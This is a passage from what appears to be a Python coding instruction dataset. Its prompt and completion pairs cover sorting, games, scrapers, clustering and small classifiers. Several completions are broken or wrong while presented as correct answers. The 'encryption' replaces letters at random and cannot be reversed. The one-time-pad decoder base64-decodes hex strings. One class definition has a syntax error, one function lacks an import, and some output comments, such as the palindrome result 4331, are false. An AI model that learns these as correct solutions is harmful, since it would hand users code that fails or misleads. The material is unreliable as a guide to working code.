fibonacci print(fibonacci(5)) # Output: [0, 1, 1, 2, 3]"},{"prompt":"Optimize an existing Python program that calculates the average age of a group of people. people = [ [Bob, 18], [Emily, 24], [Sam, 15], [John, 35] ]","completion":"total_age = 0 for person in people: total_age += int(person[1]) average_age = total_age / len(people) print(f\\"The average age of the group is {average_age}\\") # Optimized version total_age = sum([int(person[1]) for person in people]) average_age = total_age / len(people) print(f\\"The average age of the group is {average_age}\\")"},{"prompt":"Create a Python program to find the total distance of a set of given (x,y) coordinates. coordinates = [(2, 4), (3, 5), (4, 3), (9, 7)]","completion":"def totalDistance(coordinates): total = 0 for i in range(len(coordinates) - 1): distance = ((coordinates[i+1][0] - coordinates[i][0])**2 + (coordinates[i+1][1] - coordinates[i][1])**2)**(1/2) total += distance return total print(totalDistance(coordinates))"},{"prompt":"Create a GUI for a Python program that calculates the area of a rectangle. The GUI should allow users to enter the length and width of the rectangle, and it should provide a button for calculating the area. Not applicable","completion":"import tkinter as tk root = tk.Tk() length_label = tk.Label(text=\\"Length:\\") length_label.grid(row=0, column=0) length_entry = tk.Entry() length_entry.grid(row=0, column=1) width_label = tk.Label(text=\\"Width:\\") width_label.grid(row=1, column=0) width_entry = tk.Entry() width_entry.grid(row=1, column=1) def area(): area = float(length_entry.get()) * float(width_entry.get()) area_label = tk.Label(root, text=\\"Area: \\" + str(area)) area_label.grid(row=2, column=0, columnspan=2) calc_button = tk.Button(text=\\"Calculate\\", command=area) calc_button.grid(row=2, column=1) root.mainloop()"},{"prompt":"Construct a Python program to calculate the age in years of a person given their birthdate. 06/11/1996","completion":"import datetime def calculate_age(birthdate): today = datetime.date.today() current_year = today.year age = current_year - birthdate.year if ((birthdate.month, birthdate.day) > (today.month, today.day)): age -= 1 return age birthdate = datetime.date(1996, 6, 11) age = calculate_age(birthdate) print(age) # 24"},{"prompt":"Create a Python script for a sorting algorithm that can efficiently sort an array of integers. [8, 3, 5, 1, 4, 6]","completion":"def bubble_sort(lst): for i in range(len(lst)): for j in range(0, len(lst) - i - 1): if lst[j] > lst[j + 1] : lst[j], lst[j + 1] = lst[j + 1], lst[j] return lst lst = [8, 3, 5, 1, 4, 6] sorted_list = bubble_sort(lst) print(\\"Sorted Array:\\", sorted_list)"},{"prompt":"Find the most efficient algorithm to reverse a string in Python","completion":"def reverse(input): str = \\"\\" for i in input: str = i + str return str"},{"prompt":"Create a Python program to encode/decode data using a onetime padstyle of encryption. encrypted_string = 8a04de1fbc1e1fe9828ef decryption_key = a31c98","completion":"import base64 encrypted_string = base64.b64decode(encrypted_string) decryption_key = base64.b64decode(decryption_key) decrypted_string = \\"\\" assert len(encrypted_string) == len(decryption_key) for i in range(len(encrypted_string)): decrypted_string += chr(ord(encrypted_string[i]) ^ ord(decryption_key[i])) print(decrypted_string)"},{"prompt":"Rewrite the code below to use Python data structures. let numbersArray = [5, 9, 3, 2, 6, 10]; let numbersArrayIndex = 0; let currentNumber = numbersArray[numbersArrayIndex]; while (numbersArrayIndex < numbersArray.length) { console.log(currentNumber); numbersArrayIndex++; currentNumber = numbersArray[numbersArrayIndex]; }","completion":"numbers_array = [5, 9, 3, 2, 6, 10] for current_number in numbers_array: print(current_number)"},{"prompt":"Write a Python program to find the largest and smallest number from a given list of numbers. [7, 4, 2, 9, 0, 5]","completion":"def find_num(input_list): \\"\\"\\"Finds the largest and smallest number from a given list of numbers.\\"\\"\\" max_num = max(input_list) min_num = min(input_list) return max_num, min_num largest, smallest = find_num([7, 4, 2, 9, 0, 5]) print('The largest number is', largest) print('The smallest number is', smallest)"},{"prompt":"Write a Python program to iterate over a list of tuples containing student names and scores and find the student with the highest score. students = [(John, 20), (Alex, 12), (Henry, 15), (Alice, 22)]","completion":"# Store highest score and the corresponding name max_score = 0 name = '' # Loop over the list of tuples for student in students: # Get score score = student[1] # Check if score is higher than max_score if score > max_score: # Set max_score max_score = score # Set name name = student[0] # Print output print(\\"The student with the highest score is\\", name, \\"with a score of\\", max_score)"},{"prompt":"Write a Python program to find the index of an element in an array. array = [3, 7, 9, 10] element = 7","completion":"def findIndex(array, element): for i in range(len(array)): if(array[i] == element): return i return -1 # Driver code print(findIndex([3, 7, 9, 10], 7))"},{"prompt":"Create a Python program to print out the powers of 2 up to the input number n.","completion":"def print_powers_of_2(n): result = [] for i in range(n+1): result.append(2**i) return result"},{"prompt":"mplement the Kmeans algorithm in Python to cluster similar data points. Data points: [[0, 0], [4, 5], [6, 2], [2, 4]]","completion":"\\"\\"\\" Implement the K-Means Algorithm \\"\\"\\" import numpy as np def k_means_clustering(X, k): # Get data points points = np.array(X) # Generate cluster centers randomly centers = np.random.uniform(points.min(), points.max(), (k, points.shape[1])) while True: # Calculate the distances between each point and the clusters distances = np.array([np.sqrt(np.sum((points - c)**2, axis=1)) for c in centers]) # Assign each point to the closest cluster clusters = np.argmin(distances, axis=0) # Calculate the centroids of each cluster new_centers = np.array([points[clusters == i].mean(axis=0) for i in range(k)]) # Stop if the centroids haven't moved if np.linalg.norm(new_centers - centers) == 0: break # Update the cluster centers centers = new_centers return clusters if __name__ == '__main__': X = [[0, 0], [4, 5], [6, 2], [-2, 4]] k = 2 clusters = k_means_clustering(X, k) print(clusters)"},{"prompt":"Construct a function in Python that will take a list as an argument and prompt the user to delete elements from that list. my_list = [1, 2, 3, 4, 5]","completion":"def delete_element(list): print(\\"Original list: \\" + str(list)) element = int(input(\\"Please enter the element which you want to delete: \\")) list.remove(element) print(\\"List after deletion of element: \\" + str(list))"},{"prompt":"Use a recursive algorithm in Python to calculate the sum of a given array. array1 = [1, 2, 3, 4, 5]","completion":"def array_sum(arr): if len(arr) == 1: return arr[0] else: return arr[0] + array_sum(arr[1:]) #Driver code print(array_sum(array1)) #prints 15"},{"prompt":"Create a python program that encrypts a message. message = 'Hello World!'","completion":"#library to generate random numbers import random #library to perform string operations import string # function to encrypt the string def encryptMessage(message): # convert message to uppercase message = message.upper() # make a list of possible characters chars = string.ascii_uppercase #stores the encrypted form of the message encryptedMessage = \\"\\" # loops through the message for char in message: if char in chars: # finds the corresponding position of character position = chars.find(char) # takes a random element from alphabet list newposition = random.randrange(0,26) # replace the character by the character in new position encryptedMessage += chars[newposition] return encryptedMessage # Driver Code encryptedMessage = encryptMessage(message) print(encryptedMessage)"},{"prompt":"Optimize a Python program for performing matrix multiplication.","completion":"def MatrixMultiplication(A, B): # Dimensions of A m = len(A) p = len(A[0]) # Dimensions of B q = len(B) r = len(B[0]) # Generating the result matrix # C with dimensions m x r C = [[0 for row in range(0, r)] for col in range(0, m)] for i in range(0, m): for j in range(0, r): for k in range(0, p): # Performing the multiplication operation C[i][j] += A[i][k] * B[k][j] # Printing the result matrix return C"},{"prompt":"Develop a Python program to send a mail notification when a certain event is triggered.","completion":"import smtplib # Chnage this variable when the event is triggered message_sent = False if not message_sent: # Replace sender_email and receiver_email with valid email sender_email = \\"SENDER EMAIL\\" receiver_email = \\"RECEIVER EMAIL\\" message = \\"The event has been triggered.\\" server = smtplib.SMTP('smtp.gmail.com', 587) server.ehlo() server.starttls() server.login(sender_email, \\"YOUR PASSWORD\\") server.sendmail(sender_email, receiver_email, message) message_sent = True"},{"prompt":"Write a function to return the first n prime numbers in Python. Number of Prime Numbers needed: 5","completion":"def firstPrimeNumbers(number): primeNumbers = [] for num in range(1, number + 1): if (num > 1): for i in range(2, num): if (num % i == 0): break else: primeNumbers.append(num) return primeNumbers # Test code prime = firstPrimeNumbers(5) print(prime)"},{"prompt":"Modify a Python script to make it run more efficiently. import time def func(n): # the computation of the # nth term of the Fibonacci series f1 = 0 f2 = 1 count = 0 # check if the number of terms is valid if n <= 0: print(Please enter a positive integer) elif n == 1: print(f1) else: while count < n: print(f1,end= , ) nth = f1 + f2 # update values f1 = f2 f2 = nth count += 1 time.sleep(1) func(5)","completion":"import time def func(n): # the computation of the # nth term of the Fibonacci series f1 = 0 f2 = 1 nth = 0 # declaring variables to store # the previous two values so that # we can use them afterwards prev1 = 0 prev2 = 1 count = 0 # check if the number of terms is valid if n <= 0: print(\\"Please enter a positive integer\\") elif n == 1: print(f1) else: while count < n: print(f1,end=\\" , \\") # updating the values before # performing next iteration prev1 = f1 prev2 = f2 # updating nth value nth = prev1 + prev2 # update values f1 = prev2 f2 = nth count += 1 time.sleep(1) func(5)"},{"prompt":"Write a Python script to find the longest word in a given text.","completion":"def find_longest_word(text): words = text.split(' ') longest_word = '' for word in words: if len(word) > len(longest_word): longest_word = word return longest_word longest_word = find_longest_word('The quick brown fox jumps over the lazy dog') print(longest_word)"},{"prompt":"Develop a web scraper in Python to download a list of educational videos from YouTube.","completion":"# Import the necessary libraries import requests from bs4 import BeautifulSoup import urllib.parse # Make a GET request r = requests.get('https://www.youtube.com/results?search_query=' + urllib.parse.quote('educational videos')) # Parse the HTML page soup = BeautifulSoup(r.text, 'html.parser') videos = soup.find_all('h3', {'class': 'yt-lockup-title'}) # Save the links links = [video.find('a')['href'] for video in videos] # Download the videos for link in links: r = requests.get(link) with open('video.mp4', 'wb') as f: f.write(r.content)"},{"prompt":"Refactor and improve the efficiency of the following Python code. def get_intersection(list_1, list_2): result = [] for elem in list_1: if elem in list_2: result.append(elem) return resul","completion":"def get_intersection(list_1, list_2): return [elem for elem in list_1 if elem in list_2]"},{"prompt":"Create a class in Python to represent a Person.","completion":"class Person: # constructor def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender # creating a person person1 = Person(\\"John Doe\\", 35, \\"Male\\") # printing the details print(\\"Name:\\", person1.name) print(\\"Age:\\", person1.age) print(\\"Gender:\\", person1.gender)"},{"prompt":"Generate a Python script to play a simple game of tictactoe.","completion":"import random def display_board(board): print(' | |') print(' ' + board[7] + ' | ' + board[8] + ' | ' + board[9]) print(' | |') print('-----------') print(' | |') print(' ' + board[4] + ' | ' + board[5] + ' | ' + board[6]) print(' | |') print('-----------') print(' | |') print(' ' + board[1] + ' | ' + board[2] + ' | ' + board[3]) print(' | |') def player_choice(board): position = 0 while position not in [1,2,3,4,5,6,7,8,9] or not space_check(board, position): position = int(input('Choose your next position: (1-9) ')) return position def place_marker(board, marker, position): board[position] = marker def win_check(board, mark): return ((board[7] == mark and board[8] == mark and board[9] == mark) or (board[4] == mark and board[5] == mark and board[6] == mark) or (board[1] == mark and board[2] == mark and board[3] == mark) or (board[7] == mark and board[4] == mark and board[1] == mark) or (board[8] == mark and board[5] == mark and board[2] == mark) or (board[9] == mark and board[6] == mark and board[3] == mark) or (board[7] == mark and board[5] == mark and board[3] == mark) or (board[9] == mark and board[5] == mark and board[1] == mark)) def space_check(board, position): return board[position] == ' ' def full_board_check(board): for i in range(1,10): if space_check(board, i): return False return True def main(): print('Welcome to Tic Tac Toe!') while True: # Reset the board theBoard = [' '] * 10 player1_marker, player2_marker = player_input() turn = choose_first() print(turn + ' will go first.') play_game = input('Are you ready to play? Enter Yes or No.') if play_game.lower()[0] == 'y': game_on = True else: game_on = False while game_on: if turn == 'Player 1': # Player1's turn. display_board(theBoard) position = player_choice(theBoard) place_marker(theBoard, player1_marker, position) if win_check(theBoard, player1_marker): display_board(theBoard) print('Congratulations! You have won the game!') game_on = False else: if full_board_check(theBoard): display_board(theBoard) print('The game is a draw!') break else: turn = 'Player 2' else: # Player2's turn. display_board(theBoard) position = player_choice(theBoard) place_marker(theBoard, player2_marker, position) if win_check(theBoard, player2_marker): display_board(theBoard) print('Player 2 has won!') game_on = False else: if full_board_check(theBoard): display_board(theBoard) print('The game is a draw!') break else: turn = 'Player 1' if not replay(): break def player_input(): marker = '' while not (marker == 'X' or marker == 'O'): marker = input('Player 1: Do you want to be X or O? ').upper() if marker == 'X': return ('X', 'O') else: return ('O', 'X') def choose_first(): if random.randint(0, 1) == 0: return 'Player 2' else: return 'Player 1' def replay(): return input('Do you want to play again? Enter Yes or No: ').lower().startswith('y') main()"},{"prompt":"Generate a list of fibonacci numbers using iterative function in Python. n=10","completion":"def generate_fibonacci_numbers(n): # Initialize variables a = 0 b = 1 # Iterate and calculate fibonacci numbers fib_list = [a] for i in range(1, n): c = a + b fib_list.append(c) a = b b = c return fib_list if __name__ == '__main__': print(generate_fibonacci_numbers(10))"},{"prompt":"Design a function in Python to find the area of a circle from the given radius. 5","completion":"def areaCircle(radius): pi = 3.14 area = pi * (radius**2) return area print(areaCircle(5)) # 78.5"},{"prompt":"Create a function in Python for computing the average of elements in a given list. [15, 16, 5, 20, 6, 8]","completion":"def calculate_average(nums): total = 0 for i in range(len(nums)): total += nums[i] return total / len(nums)"},{"prompt":"mplement a Monte Carlo simulation in Python to calculate the probability of completing a given task. Not applicable","completion":"import random trials = 10000 successes = 0 for _ in range(trials): # Simulate process (e.g. a dice roll) outcome = random.randint(1, 6) # Keep track of successes if outcome == 6: successes += 1 # Calculate probability probability = successes / trials print(f'Probability of success: {probability: .2f}')"},{"prompt":"Write a machine learning algorithm in Python to find the nearest neighbors of a given point. point = [3, 4]","completion":"from sklearn.neighbors import NearestNeighbors def nearest_neighbors(point): neighbors = NearestNeighbors(n_neighbors=1).fit(point) return neighbors.kneighbors([point], return_distance=False)[0]"},{"prompt":"Using Python, create a function to calculate the volume of a cube with the side length as a parameter. Not applicable","completion":"def cube_volume(side): # calculate the volume of a cube return side**3 volume = cube_volume(5) # volume = 125 print(volume)"},{"prompt":"Create a Python script that given a list of numbers, multiplies each number by two and prints out the resulting list. List: [1, 5, 8, 10]","completion":"def multiply_by_two(numbers): result = [] for num in numbers: result.append(num * 2) return result numbers = [1, 5, 8, 10] print(multiply_by_two(numbers)) # Outputs: [2, 10, 16, 20]"},{"prompt":"Suggest alternative code to determine the mode of a given list in Python.","completion":"from collections import Counter def get_mode(numbers): num_count = Counter(numbers) max_count = max(num_count.values()) mode = [x for x in num_count.keys() if num_count[x] == max_count] return mode"},{"prompt":"Create a deep learning model in Python to classify animals. Input data: A dataset of images of cats, dogs, horses, and rabbits.","completion":"import tensorflow as tf from tensorflow.keras.models import Sequential from tensorflow.keras.layers import Conv2D, MaxPooling2D, Dense, Flatten # Create the model model = Sequential() model.add( Conv2D(input_shape=(150,150,3), filters=64, strides=2, padding='same', activation='relu', kernel_size=(3,3)) ) model.add( MaxPooling2D(padding='same', pool_size=(2,2)) ) model.add( Conv2D(filters=32, strides=2, activation='relu',kernel_size=(3,3)) ) model.add( MaxPooling2D(padding='same', pool_size=(2,2)) ) model.add( Flatten() ) model.add( Dense(128, activation='relu') ) model.add( Dense(4, activation='softmax') ) # Compile the model model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy']) # Train the model model.fit(train_data, train_labels, epochs=10, validation_data=(test_data, test_labels))"},{"prompt":"Create a Python program to print out a multiplication table. The table should print out the first 10 multiples of a given number. 2","completion":"number = int(input(\\"Please enter a number:\\")) for i in range(1, 11): print(f'{number} * {i} = {number*i}')"},{"prompt":"Write a Python program to optimize the following code to reduce its time complexity. def isPrime(n): for i in range(2, n): if n % i == 0: return False return True","completion":"def isPrime(n): \\"\\"\\" This function takes a number and checks if it is a prime number Args: n: an integer Returns: true if number is prime, false otherwise \\"\\"\\" # Edge case: 1 is not a prime number if n <= 1: return False # Check from 2 to the square root of number for i in range(2, int(math.sqrt(n))+1): # If number is divisible by i, it is not a prime number if (n % i == 0): return False # If not divisible by any number, it is a prime number return True # Call the function with the given input print(isPrime(n))"},{"prompt":"Construct a program in Python to check if a string contains only digits.","completion":"def is_number(s): try: float(s) return True except ValueError: return False"},{"prompt":"Construct a Python class that behaves like a stack.","completion":"class Stack: def __init__(self): self.items = [] def isEmpty(self): return self.items == [] def push(self, item): self.items.append(item) def pop(self): return self.items.pop() def peek(self): return self.items[len(self.items)-1] def size(self): return len(self.items)"},{"prompt":"Write a function in Python to traverse a multidimensional array and print each item in the array. [[1,2,3], [4,5,6], [7,8,9]]","completion":"def traverse_array(arr): if isinstance(arr, list) or isinstance(arr, tuple): for item in arr: traverse_array(item) else: print(arr) arr = [[1,2,3], [4,5,6], [7,8,9]] traverse_array(arr)"},{"prompt":"Optimize this Python code to run faster. def find_largest_number(numbers): largest = 0 for n in numbers: if n > largest: largest = n return large","completion":"def find_largest_number(numbers): largest = numbers[0] for n in numbers[1:]: if n > largest: largest = n return largest"},{"prompt":"Edit the existing Python code to output two separate lines. print(Hello World)","completion":"print(\\"Hello\\") print(\\"World\\")"},{"prompt":"Design an API in Python to compare two strings and provide an output/ match score. String1 = Hello World String2 = Hello Everyone","completion":"import difflib def compare_strings(string1, string2): # Convert strings to lowercase string1 = string1.lower() string2 = string2.lower() # Compute match score score = difflib.SequenceMatcher(None, string1, string2).ratio() # Return the match score return score"},{"prompt":"Create an algorithm in Python for finding the longest common substring of two strings. String 1: ABCDEFG String 2: FOHIJKL","completion":"# Function to find the longest common substring def longestSubstring(s1, s2): # Create an array mat = [[0 for col in range(len(s2)+1)] for row in range(len(s1)+1)] # Set maximum to 0 largestCount = 0 # Iterate through array for x in range(1, len(s1)+1): for y in range(1, len(s2)+1): # If there is a match, count increases by 1 if (s1[x-1] == s2[y-1]): mat[x][y] = mat[x-1][y-1] + 1 # check for new max, and update if (largestCount < mat[x][y]): largestCount = mat[x][y] # If no match, set count as 0 else: mat[x][y] = 0 # Return largest count return largestCount"},{"prompt":"Construct a Python script that automates the process of detecting an object. The input consists of an image with a dog, an image with a cat, an image with a table and an image with a chair.","completion":"from keras.preprocessing import image from keras.applications.imagenet_utils import preprocess_input, decode_predictions import numpy as np object_types = ['dog', 'cat', 'table', 'chair'] def detect_objects(img_path): img = image.load_img(img_path, target_size=(224, 224)) x = image.img_to_array(img) x = np.expand_dims(x, axis=0) x = preprocess_input(x) predictions = model.predict(x) results = decode_predictions(predictions) top_result = results[0][0] top_result_class = top_result[1] if top_result_class in object_types: print(\\"The detected object is a {}\\".format(top_result_class)) else: print(\\"The object is not in the given categories\\")"},{"prompt":"Create a Python class for a library book with fields for title, author, and ISBN. Not applicable","completion":"class Book: def __init__(self, title, author, isbn): self.title = title self.author = author self.isbn = isbn b1 = Book(\\"Great Expectations\\", \\"Charles Dickens\\", \\"123-456-789\\") b2 = Book(\\"Brave New World\\", \\"Aldous Huxley, \\"987-654-321\\")"},{"prompt":"Design a class in Python for representing a student.","completion":"class Student: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender"},{"prompt":"Generate a python program that calculates the area of a triangle given the coordinates of its vertices. A=(2, 0), B=(2, 0), C=(0, 4)","completion":"def triangle_area(A, B, C): return abs((A[0]*(B[1] - C[1]) + B[0]*(C[1] - A[1]) + C[0]*(A[1] - B[1]))/2.0) # Driver Code A = (2, 0) B = (-2, 0) C = (0, 4) print(\\"Area of Triangle is\\", triangle_area(A, B, C))"},{"prompt":"Keep a record of all the URLs visited from a given website in Python.","completion":"def track_urls(url): visited_urls = set() current_url = url while current_url: if current_url not in visited_urls: visited_urls.add(current_url) current_url = get_next_url(current_url) return visited_urls"},{"prompt":"Write a Python program to read in a list of words separated by spaces and reverse them inplace. word_list = [Birds, fly, in, the, sky]","completion":"word_list.reverse()"},{"prompt":"With Python, create a web scraper that collects text from a blog. Not applicable","completion":"import requests from bs4 import BeautifulSoup def scrape_blog(url): r = requests.get(url) content = r.content soup = BeautifulSoup(content) text_blocks = soup.find_all('p') text = '' for block in text_blocks: text += block.text return text"},{"prompt":"We are given the input and output schematic of a neural network. You are required to implement the network in Python code. Inputs=[2,1] Hidden1=[2] Outputs=[1]","completion":"import numpy as np # Inputs x = np.array([2, 1]) # Weights - Initilise to random values w1 = np.random.rand(2, 2) w2 = np.random.rand(2, 1) # Hidden layer h1 = np.matmul(x, w1) # Output layer y = np.matmul(h1, w2)"},{"prompt":"Develop a function in Python which takes two inputs and returns the greatest common divisor of those two numbers. 12, 24","completion":"def greatest_common_divisor(a, b): if a < b: a, b = b, a while b > 0: a, b = b, a % b return a result = greatest_common_divisor(12, 24) print(result)"},{"prompt":"Using any programming language of your choice, write a calculator program that takes in two integers and returns the result of the addition operation. 7, 9","completion":"// Java public int Add(int a, int b) { return a + b; } // Python def add(a, b): return a + b"},{"prompt":"Write a Python program to find the largest palindrome number less than 4400. Not applicable","completion":"max_palindrome = 0 for i in range(4400, 0, -1): if str(i) == str(i)[::-1]: max_palindrome = i break print(max_palindrome) # Output: 4331"},{"prompt":"Write a Python function that takes an array of integers as input and computes the average of the elements. array = [1, 2, 3, 4]","completion":"def compute_average(arr): sum = 0 for i in arr: sum += i return sum / len(arr) arr = [1, 2, 3, 4] avg = compute_average(arr) print(\\"Average of array elements is:\\", avg)"},{"prompt":"Create a script in Python to select topn most frequent words from a list of words. words.txt (plaintext file; each line containing a word)","completion":"import collections # Load Data with open('words.txt', 'r') as file: words = [line.strip() for line in file.readlines()] # Count the frequency of each word in the list frequency = collections.Counter(words) # Select the top n most frequent words n = 10 top_words = frequency.most_common(n) # Output print('The ' + str(n) + ' most frequent words are:') for word, count in top_words: print('t' + word + ' (' + str(count) + ')')"},{"prompt":"Create an optimization problem in Python to maximize a given linear objective function subject to two linear constraints. Not applicable","completion":"# Importing packages import scipy.optimize as opt # Objective function z = lambda x, y: 5*x + 6*y # Defining constraints c1 = lambda x, y: 22 - x - y c2 = lambda x, y: 15 - 2*x - 4*y # Bounds bnds = ((0, None), (0, None)) # Constraints con1 = {'type': 'ineq', 'fun': c1} con2 = {'type': 'ineq', 'fun': c2} cons = [con1, con2] #Optimization sol = opt.minimize(z, (0, 0), bounds = bnds, constraints = cons) print(sol)"},{"prompt":"mplement a class in Python called “Multiplier” with a constructor function that takes an argument “factor”. The class should have a method called “multiply” which takes a number as an argument and returns this multiplied by “factor”. factor = 5","completion":"class Multiplier: def __init__(self, factor): self.factor = factor def multiply(self, num): return num * self.factor"},{"prompt":"Write a python program to calculate the maximum of 3d array and return the value. arr = [[[1, 2], [3, 4]], [[5, 6], [7, 8]], [[9, 10], [11, 12]]]","completion":"def calc_max(arr): max_val = arr[0][0][0] for i in range(len(arr)): for j in range(len(arr[i])): for k in range(len(arr[i][j])): if arr[i][j][k] > max_val: max_val = arr[i][j][k] return max_val print(calc_max(arr))"},{"prompt":"Create a Python program to accept two values from the user and calculate the greatest common divisor. val1 = 4 val2 = 12","completion":"# Function for calculating the # greatest common divisor def gcd(a, b): if (a == 0): return b return gcd(b%a, a) # Take input from the user val1 = int(input(\\"Enter the first value: \\")) val2 = int(input(\\"Enter the second value: \\")) # Calculate the gcd result = gcd(val1, val2) print(\\"The GCD of\\",val1,\\"and\\",val2,\\"is\\",result)"},{"prompt":"Generate a Python script that classifies dogs into breed classes.","completion":"import cv2 # Classifies a given image into one of the breed classes def classify(image): # Retrieve the breed classes from the database breeds = get_breeds() closest_distance = float('inf') closest_breed = None # Create a feature descriptor for the image feature_descriptor = cv2.xfeatures2d.SIFT_create() (keypoints, descriptors) = feature_descriptor.detectAndCompute(image, None) # For each breed in the database for breed in breeds: # Compute the Euclidean distance between the descriptors distance = 0 for i in range(len(descriptors)): distance += np.linalg.norm(descriptors[i] - breed[i]) # If it is smaller than the current distance, set it as the new closest distance if distance < closest_distance: closest_distance = distance closest_breed = breed # Return the closest breed return closest_breed"},{"prompt":"Create an AI model in Python that can classify text into 3 classes: positive, negative or neutral. <example data> I had a great experience The customer support was horrible It was ok","completion":"import pandas as pd from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB # Create labels data = [\\"I had a great experience\\", \\"The customer support was horrible\\", \\"It was ok\\"] labels = [1, 0, 2] # Fit the Vectorizer vectorizer = CountVectorizer() counts = vectorizer.fit_transform(data) # Train the classifier classifier = MultinomialNB() targets = labels classifier.fit(counts, targets) # Make predictions examples = [\\"I had a great time\\", \\"Their customer service was so bad\\"] example_counts = vectorizer.transform(examples) predictions = classifier.predict(example_counts) # Print predictions print(predictions) # Output: [1, 0]"},{"prompt":"Design and build a binary tree structure and associated functions in Python to insert and search elements.","completion":"# Node class class Node: def __init__(self, data): self.data = data self.left = None self.right = None # Binary Tree class class BinaryTree: def __init__(self): self.root = None def insert(self, data): # Instantiate new Node new_node = Node(data) # Set the root node to the new node if the tree is empty if self.root == None: self.root = new_node else: # Create a current node pointer current_node = self.root while True: # If current node's data is greater than data to be inserted if current_node.data > data: # Check if left node is empty if current_node.left == None: # If left node is empty, insert the data and break loop current_node.left = new_node break else: # If left node is occupied, move left node to current node and loop current_node = current_node.left # If current node's data is lesser than data to be inserted else: # Check if right node is empty if current_node.right == None: # If right node is empty, insert the data and break loop current_node.right = new_node break else: # If right node is occupied, move right node to current node and loop current_node = current_node.right def search(self, data): current_node = self.root while current_node: if current_node.data == data: return True elif current_node.data > data: current_node = current_node.left else: current_node = current_node.right return False if __name__ == '__main__': tree = BinaryTree() tree.insert(5) tree.insert(1) tree.insert(0) tree.insert(4) tree.insert(2) tree.insert(3) tree.insert(6) tree.insert(7) result = tree.search(3) print(result)"},{"prompt":"Create a Python program that takes in two strings, and find out all the characters that occur in both strings. s1 = elephant s2 = phantasm","completion":"s1 = set([i for i in s1]) s2 = set([i for i in s2]) common = list(s1.intersection(s2)) print(\\"The following characters occur in both the words: \\" + ', '.join(common))"},{"prompt":"Generate a Python program which will classify a given set of words into two groups: nouns and verbs.","completion":"\\"\\"\\" Generate a Python program which will classify a given set of words into two groups: nouns and verbs. \\"\\"\\" import nltk def classify_words(words): # initialize empty dictionaries nouns = {} verbs = {} # extract parts-of-speech for word in words: pos = nltk.pos_tag([word])[0][1] # add to nouns or verbs if pos.startswith('N'): nouns[word] = pos elif pos.startswith('V'): verbs[word] = pos return nouns,verbs if __name__ == '__main__': words = ['apple', 'walk', 'write', 'run'] nouns, verbs = classify_words(words) print('Nouns:', nouns) print('Verbs:', verbs)"},{"prompt":"Create a program in Python to find the total number of words in a text This is a sample tex","completion":"def word_total(text): words = text.split(\\" \\") word_count = len(words) return word_count"},{"prompt":"Create a function in Python that takes a sorted list of random integers and returns only the unique values in the list (no duplicates). Not applicable","completion":"def get_unique_values(list_of_integers): unique_values = [] for value in list_of_integers: if value not in unique_values: unique_values.append(value) return unique_values # Testing list_integers = [2, 3, 4, 4, 5, 6, 7, 7, 8, 8] print(get_unique_values(list_integers)) # [2, 3, 4, 5, 6, 7, 8]"},{"prompt":"Generate a json response from a python method that takes two parameters and returns a dictionary of keyvalue mappings. param1 = 'key1' param2 = 'value1'","completion":"def generate_response(param1, param2): # dictionary of key-value mappings key_value_mappings = { param1: param2 } # create json response json_response = json.dumps(key_value_mappings) return json_response"},{"prompt":"Generate a python class 'Employee' with properties 'name' and 'salary'.","completion":"class Employee: def __init__(self, name, salary): self.name = name self.salary = salary def get_name(self): return self.name def get_salary(self): return self.salary"},{"prompt":"Create a Python function to sort the words in a sentence. Sentence = I love coding","completion":"def sort_words(sentence): words = sentence.split(\\" \\") words.sort() return ' '.join(words) sentence = \\"I love coding\\" sortedSentence = sort_words(sentence) print(sortedSentence) // Outputs 'I coding love'"},{"prompt":"Create a game using only Python code. Not applicable","completion":"import random import time def game_loop(): game_running = True display_intro() while game_running: user_input = input(\\" What action do you choose? \\") if user_input == \\"run\\": start_running() elif user_input == \\"look\\": enemy_random_number = random.randint(1, 10) if enemy_random_number > 3: print(\\"You see a monster!\\") continue_running = input(\\"Do you continue running or do you fight? \\") if continue_running == \\"run\\": start_running() elif continue_running == \\"fight\\": fight_monster() else: print(\\"Nothing to see here.\\") elif user_input == \\"quit\\": print(\\"You quitted the game.\\") game_running = False else: print(\\"Invalid input!\\") def display_intro(): print(\\"Welcome to the game!\\") print(\\"Type 'run' to start the game or 'quit' to quit the game.\\") def start_running(): print(\\"You started running.\\") time.sleep(3) print(\\"You encountered an obstacle.\\") obstacle_random_number = random.randint(1,10) if obstacle_random_number < 3: print(\\"You were successful in overcoming the obstacle.\\") print(\\"You continue running.\\") elif obstacle_random_number > 6: print(\\"You were unsuccessful in overcoming the obstacle.\\") print(\\"You got stuck and had to turn back.\\") else: print(\\"You were lucky and the obstacle disappeared.\\") print(\\"You continue running.\\") def fight_monster(): monster_random_number = random.randint(1,10) if monster_random_number < 5: print(\\"You won the fight!\\") elif monster_random_number > 6: print(\\"You lost the fight!\\") else: chance_random_number = random.randint(1,10) if chance_random_number < 5: print(\\"You managed to escape the fight!\\") else: print(\\"You failed to escape the fight and lost!\\") #Run game loop game_loop()"},{"prompt":"Develop an object recognition code in Python.","completion":"import cv2 # Create the classifier classifier = cv2.CascadeClassifier(\\"haarcascade.xml\\") # Load the image img = cv2.imread(\\"image.jpg\\") # Detect objects in the image objects = classifier.detectMultiScale(img) # Loop through the objects and identify it for (x,y,w,h) in objects: cv2.rectangle(img,(x,y),(x+w,y+h), (255,0,0), 2) cv2.putText(img, \\"Object\\", (x,y-10), cv2.FONT_HERSHEY_PLAIN, 1, (0,255,0), 2) # Display the resulting frame cv2.imwrite(\\"result.jpg\\", img)"},{"prompt":"Write a Python program that sorts a list of integers from smallest to largest. [2,7,3,9,0,4]","completion":"def sort_list(input_list): sorted_list = sorted(input_list) return sorted_list input_list = [2,7,3,9,0,4] output = sort_list(input_list) print(output)"},{"prompt":"Create an algorithm in Python to fill every element in a matrix with its own column number. [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]] for row_index, row in enumerate(matrix): for col_index, _ in enumerate(row): matrix[row_index][col_index] = col_index + 1 print(matrix)"},{"prompt":"Create a Python program that takes in an array and returns an array with each element multiplied by two. [2, 3, 4]","completion":"def double_array_elements(arr): new_arr = [] for num in arr: new_arr.append(num * 2) return new_arr arr = [2, 3, 4] new_arr = double_array_elements(arr) print(new_arr) # [4, 6, 8]"},{"prompt":"Create a program in Python for a simple chatbot that can answer questions about the weather in the US. Sample customer inquiries about the weather: What is the weather like in Chicago today? What will the temperature be in San Francisco tomorrow? What is the 